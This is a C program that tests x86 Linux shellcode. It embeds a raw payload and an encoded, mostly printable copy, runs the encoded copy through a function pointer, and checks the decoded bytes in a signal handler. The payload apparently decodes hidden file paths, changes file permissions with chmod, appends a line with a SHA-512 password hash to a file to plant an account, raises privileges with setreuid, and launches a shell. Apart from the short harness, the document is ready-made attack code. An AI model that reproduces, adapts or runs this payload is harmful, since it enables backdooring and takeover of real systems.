#include<stdio.h>
#include<string.h>
#include<signal.h>
#include<unistd.h>
#include<stdlib.h>
#define E 164
#define L 1024
int n;
char original[] =
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xbb\x59\x45\x4f\x53\xba\x33\x36\x38\x37\x31\xd3\x53\xc1\xeb\x08\x53\xbb\x7a\x46\x59\x45\xba\x55\x36\x38\x36\x31\xd3\x53\xbb\x67\x58\x45\x4e\xba\x48\x3d\x31\x2d\x31\xd3\x53\x89\xe3\x68\x41\x41\xff\x01\x59\xc1\xe9\x08\xc1\xe9\x08\x6a\x0f\x58\xcd\x80\xbb\x53\x49\x57\x4a\xba\x39\x2d\x38\x3d\x31\xd3\xc1\xeb\x08\x53\xbb\x6d\x47\x45\x58\xba\x42\x34\x2d\x39\x31\xd3\x53\xbb\x6e\x54\x49\x57\xba\x41\x31\x3d\x34\x31\xd3\x53\x89\xe3\x68\x41\x41\xff\x01\x59\xc1\xe9\x08\xc1\xe9\x08\x6a\x0f\x58\xcd\x80\xbb\x73\x47\x4e\x51\xba\x32\x34\x39\x35\x31\xd3\xc1\xeb\x08\x53\xbb\x59\x44\x56\x44\xba\x76\x34\x37\x37\x31\xd3\x53\xbb\x4e\x58\x59\x51\xba\x61\x3d\x2d\x32\x31\xd3\x53\x89\xe3\x68\x41\x41\x01\x04\x59\xc1\xe9\x08\xc1\xe9\x08\x6a\x05\x58\xcd\x80\x89\xc3\x6a\x04\x58\x68\x41\x73\x68\x0a\x59\xc1\xe9\x08\x51\xb9\x57\x67\x57\x58\xba\x39\x48\x35\x39\x31\xd1\x51\xb9\x4e\x64\x5a\x51\xba\x74\x4b\x38\x38\x31\xd1\x51\xb9\x47\x57\x56\x42\xba\x35\x38\x39\x36\x31\xd1\x51\xb9\x61\x70\x51\x4e\xba\x2d\x39\x6b\x61\x31\xd1\x51\xb9\x48\x58\x70\x74\xba\x72\x68\x4a\x35\x31\xd1\x51\xb9\x76\x45\x56\x46\xba\x3d\x6b\x6c\x76\x31\xd1\x51\x68\x66\x77\x55\x57\x68\x68\x70\x31\x50\x68\x7a\x59\x65\x41\x68\x41\x61\x41\x51\x68\x49\x38\x75\x74\x68\x50\x4d\x59\x68\x68\x54\x42\x74\x7a\x68\x51\x2f\x38\x54\x68\x45\x36\x6d\x67\x68\x76\x50\x2e\x73\x68\x4e\x58\x52\x37\x68\x39\x4b\x55\x48\x68\x72\x2f\x59\x42\x68\x56\x78\x4b\x47\x68\x39\x55\x66\x5a\x68\x46\x56\x6a\x68\x68\x46\x63\x38\x79\x68\x70\x59\x6a\x71\x68\x77\x69\x53\x68\x68\x6e\x54\x67\x54\x68\x58\x4d\x69\x37\x68\x2f\x41\x6e\x24\x68\x70\x55\x6e\x4d\x68\x24\x36\x24\x6a\xb9\x73\x61\x74\x67\xba\x32\x2d\x3d\x5d\x31\xd1\x51\x89\xe1\xba\x41\x41\x41\x7f\xc1\xea\x08\xc1\xea\x08\xc1\xea\x08\xcd\x80\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\x68\x52\x55\x48\x42\x68\x52\x51\x49\x43\xb9\x49\x4b\x59\x77\xba\x66\x38\x31\x35\x31\xd1\x51\xb9\x55\x55\x54\x57\xba\x7a\x37\x3d\x39\x31\xd1\x51\x89\xe3\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xb0\x01\xb3\x01\xcd\x80";
char shellcode[]=
"\x60\x50\x59\x6a\x30\x58\x34\x30\x48\x50\x5b\x6a\x30\x58\x30\x59\x35\x30\x41\x4f\x30\x59\x4f\x30\x59\x60\x30\x41\x61\x30\x59\x61\x30\x41\x62\x30\x59\x69\x30\x41\x6a\x30\x59\x6a\x30\x41\x6b\x30\x59\x6d\x30\x59\x6e\x72\x49\x49\x30\x59\x37\x30\x41\x38\x30\x59\x38\x30\x41\x39\x30\x59\x3d\x30\x59\x3e\x30\x59\x47\x51\x5a\x4f\x79\x5b\x26\x74\x3c\x6a\x30\x58\x34\x30\x50\x5b\x32\x59\x5b\x43\x3f\x2c\x34\x32\x41\x5c\x40\x24\x3C\x3f\x27\x32\x30\x27\x77\x42\x5b\x6a\x30\x58\x34\x30\x50\x5b\x32\x59\x5c\x43\x32\x41\x5d\x40\x3f\x2c\x36\x24\x3f\x30\x27\x77\x42\x5c\x42\x42\x41\x41\x41\x75\x41\x61\x31\xc0\xb0\x14\xcd\x80\x50\x5b\x31\xc0\x31\xc9\xb0\x25\xb1\x0f\xcd\x80"
"2F?2FZ2FH2FQ:lX3TN4My2Ku2_v2FR4N@=kG4Mz6hE4dD:hT2Ww2Wp<LR:lf4`D3yy3_|2Cl2FR4MH=Lg3D@>{@4f@=cG;Fh/`i/|W;u?:lR3dV3iy2cl2_|2FR;Fj/`R:ll3\\D4ay3Gs1sx2FR4Mz5xS3dV:h@2C|2Op<LR7fb5`@3F~/DX;Fh/b@=cG5gN4bL7Az6LF3xP:gq2Ox2Sp<N@=kG4Mz4dC4XC:hu2Ov2[p<LR:lM4`X4Ey5C|1sq2FR4MH=Lg3D@/CC4f@=cG;Fh/`i/TW;u?7fB5gC4`g3Dr5_I4f@=cG4Ex4\\f4\\W:gx3_t2cp<DP:dM5PY4Ey6PJ2_w2FP4Ex3\\V4XA:gt2_x2Wp<DP:d`6@P3yy1sx5l`2FP4Ex3`W6@s:hq5`I2Sp<DP:du3TU3Yy2tj5pu2FP4Dg5Xv4TV5`g6?p4@g6hX5T@5`@5D@4Dg3cw6Ts5`O3tX5`g4PA6Py5`P1{w4Pg3Su5tf5`u4?m6Lg3xW4Gv5_x3lT3`g6Gn4dA5`U6`J3\\g2dT5XY5`E4Xi5`g3Xb2`x5`o4di6Dg6\\h4Lg5`m4Pf4Pg4`L5cv5_n3Dm1Pg6@T5xL5_c2Wc5ix6L`6Pf:gq1s|4sp<DP7f`:h@3D@6~@=gG;Fi/b@=gG;u?2F?:@E2FZ2FH;u?2F?:@E2FZ2FH;u?5`Q4TG3Hg4HP3dB:dH3lX6]y5Ww2Ct2FP4Ex4TT4PV:hy2[|2cp<DP7fb2F?7`B/]H4kG7dB/qo/mL3kG7tR/rL7Ao/Er/FL7AO&";
void handler_function()
{
	printf("Testing start......\n");
	int i,j;
	for(i = 0 ,j = E; i < n-1 ; i++,j++)
	{
		if(original[i] != shellcode[j])
		{
			printf("Byte Num %d = %d\n",i,original[i]);
		}
	}
	printf("Finish\n");
	exit(1);
}
int main(int argc,char *argv[])
{
n = sizeof(original);
signal(SIGTERM,handler_function);
printf("Shellcode: %s\n",shellcode);
printf("Shellcode Length: %d\n", strlen(shellcode));
int (*ret)() = (int(*)())shellcode;
ret();
}
